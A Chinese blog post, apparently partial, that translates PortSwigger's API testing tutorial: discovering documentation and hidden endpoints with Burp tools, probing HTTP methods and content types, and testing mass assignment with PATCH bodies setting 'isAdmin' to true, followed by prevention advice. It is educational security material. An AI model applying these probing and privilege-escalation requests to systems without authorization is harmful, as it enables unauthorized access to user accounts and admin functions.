<p>此请求的API端点是<code>/api/books</code>。这将导致与API的交互，以从图书馆检索书籍列表。另一个API端点可能是例如<code>/api/books/mystery</code>，它将检索悬疑书籍列表。</p>
<p>识别端点后，您需要确定如何与它们交互。这使您能够构建有效的HTTP请求以测试API。例如，您应该了解以下内容：</p>
<ul>
<li>API处理的输入数据，包括强制性和可选参数。</li>
<li>API接受的请求类型，包括支持的HTTP方法和媒体格式。</li>
<li>速率限制和认证机制。</li>
</ul>
<h2 id="API文档"><a href="#API文档" class="headerlink" title="API文档"></a><strong>API文档</strong></h2><p>API通常会进行文档化，以便开发人员知道如何使用和集成它们。</p>
<p>文档可以是人类可读的和机器可读的。人类可读的文档旨在让开发人员了解如何使用API。它可能包括详细说明、示例和使用场景。机器可读的文档旨在被软件处理，以自动化API集成和验证等任务。它以JSON或XML等结构化格式编写。</p>
<p>API文档通常是公开可用的，特别是如果API旨在供外部开发人员使用。如果是这种情况，请始终从审查文档开始您的侦察。</p>
<h2 id="发现API文档"><a href="#发现API文档" class="headerlink" title="发现API文档"></a><strong>发现API文档</strong></h2><p>即使API文档没有公开提供，您仍然可以通过浏览使用API的应用程序来访问它。</p>
<p>为此，您可以使用Burp Scanner来爬取API。您也可以使用Burp的浏览器手动浏览应用程序。寻找可能指向API文档的端点，例如：</p>
<ul>
<li><code>/api</code></li>
<li><code>/swagger/index.html</code></li>
<li><code>/openapi.json</code></li>
</ul>
<p>如果您识别出一个资源端点，请确保调查基础路径。例如，如果您识别出资源端点<code>/api/swagger/v1/users/123</code>，那么您应该调查以下路径：</p>
<ul>
<li><code>/api/swagger/v1</code></li>
<li><code>/api/swagger</code></li>
<li><code>/api</code></li>
</ul>
<p>您还可以使用Intruder和常见路径列表来查找文档。</p>
<h2 id="使用机器可读文档"><a href="#使用机器可读文档" class="headerlink" title="使用机器可读文档"></a><strong>使用机器可读文档</strong></h2><p>您可以使用一系列自动化工具来分析您找到的任何机器可读的API文档。</p>
<p>您可以使用Burp Scanner来爬取和审计OpenAPI文档，或者任何其他JSON或YAML格式的文档。您还可以使用OpenAPI解析器BApp来解析OpenAPI文档。</p>
<p>您也可以使用专门的工具来测试文档化的端点，例如Postman或SoapUI。</p>
<h2 id="识别API端点"><a href="#识别API端点" class="headerlink" title="识别API端点"></a><strong>识别API端点</strong></h2><p>您还可以通过浏览使用API的应用程序来获取大量信息。即使您有API文档，这也值得一做，因为有时文档可能不准确或过时。</p>
<p>您可以使用Burp Scanner来爬取应用程序，然后使用Burp的浏览器手动调查有趣的攻击面。</p>
<p>在浏览应用程序时，寻找URL结构中暗示API端点的模式，例如<code>/api/</code>。还要注意JavaScript文件。这些文件可能包含您尚未通过Web浏览器直接触发的API端点的引用。Burp Scanner在爬取过程中会自动提取一些端点，但为了进行更深入的提取，请使用JS链接查找器BApp。您也可以在Burp中手动审查JavaScript文件。</p>
<h2 id="与API端点交互"><a href="#与API端点交互" class="headerlink" title="与API端点交互"></a><strong>与API端点交互</strong></h2><p>识别API端点后，使用Burp Repeater和Burp Intruder与它们交互。这使您能够观察API的行为并发现额外的攻击面。例如，您可以研究API在更改HTTP方法和媒体类型时的响应。</p>
<p>在与API端点交互时，仔细审查错误消息和其他响应。有时这些消息中包含可用于构建有效HTTP请求的信息。</p>
<h2 id="识别支持的HTTP方法"><a href="#识别支持的HTTP方法" class="headerlink" title="识别支持的HTTP方法"></a><strong>识别支持的HTTP方法</strong></h2><p>HTTP方法指定要对资源执行的操作。例如：</p>
<ul>
<li>GET - 从资源中检索数据。</li>
<li>PATCH - 对资源应用部分更改。</li>
<li>OPTIONS - 检索可以对资源使用的请求方法类型。</li>
</ul>
<p>API端点可能支持不同的HTTP方法。因此，在调查API端点时，测试所有潜在方法非常重要。这可能使您能够识别额外的端点功能，从而扩大攻击面。</p>
<p>例如，端点<code>/api/tasks</code>可能支持以下方法：</p>
<ul>
<li>GET <code>/api/tasks</code> - 检索任务列表。</li>
<li>POST <code>/api/tasks</code> - 创建一个新任务。</li>
<li>DELETE <code>/api/tasks/1</code> - 删除一个任务。</li>
</ul>
<p>您可以使用Burp Intruder内置的HTTP动词列表，自动循环使用一系列方法。</p>
<h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a><strong>注意</strong></h3><p>在测试不同的HTTP方法时，针对低优先级对象。这有助于确保您避免意外后果，例如更改关键项目或创建过多记录。</p>
<h2 id="识别支持的内容类型"><a href="#识别支持的内容类型" class="headerlink" title="识别支持的内容类型"></a><strong>识别支持的内容类型</strong></h2><p>API端点通常期望以特定格式接收数据。因此，它们可能会根据请求中提供的数据内容类型而表现出不同的行为。更改内容类型可能使您能够：</p>
<ul>
<li>触发披露有用信息的错误。</li>
<li>绕过有缺陷的防御。</li>
<li>利用处理逻辑的差异。例如，API在处理JSON数据时可能是安全的，但在处理XML时可能容易受到注入攻击。</li>
</ul>
<p>要更改内容类型，请修改<code>Content-Type</code>头，然后相应地重新格式化请求正文。您可以使用内容类型转换器BApp自动将请求中提交的数据在XML和JSON之间转换。</p>
<h2 id="使用Intruder查找隐藏端点"><a href="#使用Intruder查找隐藏端点" class="headerlink" title="使用Intruder查找隐藏端点"></a><strong>使用Intruder查找隐藏端点</strong></h2><p>识别了一些初始API端点后，您可以使用Intruder来发现隐藏的端点。例如，假设您识别出以下用于更新用户信息的API端点：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PUT /api/user/update</span><br></pre></td></tr></table></figure>

<p>要识别隐藏的端点，您可以使用Burp Intruder来查找具有相同结构的其他资源。例如，您可以在路径的<code>/update</code>位置添加一个有效载荷，使用其他常见函数（如<code>delete</code>和<code>add</code>）的列表。</p>
<p>在查找隐藏端点时，使用基于常见API命名约定和行业术语的字典。确保您还包括基于初始侦察与应用程序相关的术语。</p>
<h2 id="寻找隐藏参数"><a href="#寻找隐藏参数" class="headerlink" title="寻找隐藏参数"></a><strong>寻找隐藏参数</strong></h2><p>在进行API侦察时，您可能会发现API支持的未记录参数。您可以尝试使用这些参数来改变应用程序的行为。Burp包含许多可以帮助您识别隐藏参数的工具：</p>
<ul>
<li>Burp Intruder使您能够使用常见参数名称的字典自动发现隐藏参数，以替换现有参数或添加新参数。确保您还包括基于初始侦察与应用程序相关的名称。</li>
<li>Param Miner BApp使您能够自动猜测每个请求的多达65,536个参数名称。Param Miner根据范围中的信息自动猜测与应用程序相关的名称。</li>
<li>内容发现工具使您能够发现未从可见内容链接的内容，包括参数。</li>
</ul>
<h2 id="批量赋值漏洞"><a href="#批量赋值漏洞" class="headerlink" title="批量赋值漏洞"></a><strong>批量赋值漏洞</strong></h2><p>批量赋值（也称为自动绑定）可能会无意中创建隐藏参数。当软件框架自动将请求参数绑定到内部对象的字段时，就会发生这种情况。因此，批量赋值可能导致应用程序支持开发人员从未打算处理的参数。</p>
<h2 id="识别隐藏参数"><a href="#识别隐藏参数" class="headerlink" title="识别隐藏参数"></a><strong>识别隐藏参数</strong></h2><p>由于批量赋值是从对象字段创建参数的，您通常可以通过手动检查API返回的对象来识别这些隐藏参数。</p>
<p>例如，考虑一个PATCH <code>/api/users/</code>请求，允许用户更新他们的用户名和电子邮件，并包含以下JSON：</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span> <span class="attr">&quot;username&quot;</span><span class="punctuation">:</span> <span class="string">&quot;wiener&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;email&quot;</span><span class="punctuation">:</span> <span class="string">&quot;wiener@example.com&quot;</span> <span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>同时，一个并发的GET <code>/api/users/123</code>请求返回以下JSON：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123; &quot;id&quot;: 123, &quot;name&quot;: &quot;John Doe&quot;, &quot;email&quot;: &quot;john@example.com&quot;, &quot;isAdmin&quot;: &quot;false&quot; &#125;</span><br></pre></td></tr></table></figure>

<p>这可能表明隐藏的<code>id</code>和<code>isAdmin</code>参数与内部用户对象绑定，与更新的用户名和电子邮件参数一起。</p>
<h2 id="测试批量赋值漏洞"><a href="#测试批量赋值漏洞" class="headerlink" title="测试批量赋值漏洞"></a><strong>测试批量赋值漏洞</strong></h2><p>要测试您是否可以修改枚举出的<code>isAdmin</code>参数值，请将其添加到PATCH请求中：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123; &quot;username&quot;: &quot;wiener&quot;, &quot;email&quot;: &quot;wiener@example.com&quot;, &quot;isAdmin&quot;: false &#125;</span><br></pre></td></tr></table></figure>

<p>此外，发送一个带有无效<code>isAdmin</code>参数值的PATCH请求：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123; &quot;username&quot;: &quot;wiener&quot;, &quot;email&quot;: &quot;wiener@example.com&quot;, &quot;isAdmin&quot;: &quot;foo&quot; &#125;</span><br></pre></td></tr></table></figure>

<p>如果应用程序的行为不同，这可能表明无效值影响了查询逻辑，但有效值没有。这可能表明用户可以成功更新该参数。</p>
<p>然后，您可以发送一个将<code>isAdmin</code>参数值设置为<code>true</code>的PATCH请求，尝试利用该漏洞：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123; &quot;username&quot;: &quot;wiener&quot;, &quot;email&quot;: &quot;wiener@example.com&quot;, &quot;isAdmin&quot;: true &#125;</span><br></pre></td></tr></table></figure>

<p>如果请求中的<code>isAdmin</code>值绑定到用户对象而没有足够的验证和清理，用户wiener可能会被错误地授予管理员权限。要确定是否是这种情况，请以wiener身份浏览应用程序，看看是否可以访问管理员功能。</p>
<h2 id="防止API中的漏洞"><a href="#防止API中的漏洞" class="headerlink" title="防止API中的漏洞"></a><strong>防止API中的漏洞</strong></h2><p>在设计API时，确保从一开始就考虑安全性。特别是，您要确保：</p>
<ul>
<li>如果您不希望API公开可访问，请保护您的文档。</li>
<li>确保文档保持最新，以便合法测试人员能够全面了解API的攻击面。</li>
<li>应用允许的HTTP方法白名单。</li>
<li>验证每个请求或响应的内容类型是否符合预期。</li>
<li>使用通用错误消息，以避免泄露可能对攻击者有用的信息。</li>
<li>在所有版本的API上使用保护措施，而不仅仅是当前生产版本。</li>
</ul>
<p>为了防止批量赋值漏洞，允许用户更新的属性列入白名单，并将不应由用户更新的敏感属性列入黑名单。</p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>文章翻译来自portswigger的academy文章：</p>
<p><a href="https://link.zhihu.com/?target=https://portswigger.net/web-security/api-testing">API testing | Web Security Academyportswigger.net&#x2F;web-security&#x2F;api-testing</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://amiduai.github.io/2025/02/10/API%E6%B5%8B%E8%AF%95/" data-id="cm70ivegq0002fk6s5uoweijz" data-title="API测试" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  


</section>
        
          <aside id="sidebar">
  
    

  
    

  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/02/">February 2025</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2025/02/18/OAuth/">绕过 CSRF 令牌验证</a>
          </li>
        
          <li>
            <a href="/2025/02/17/clickhijacking/">CORS</a>
          </li>
        
          <li>
            <a href="/2025/02/16/CSRF(3)/">绕过 samesite限制</a>
          </li>
        
          <li>
            <a href="/2025/02/15/CSRF(1)/">CSRF</a>
          </li>
        
          <li>
            <a href="/2025/02/15/CSRF(2)/">绕过 CSRF 令牌验证</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2025 John Doe<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.6.4.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>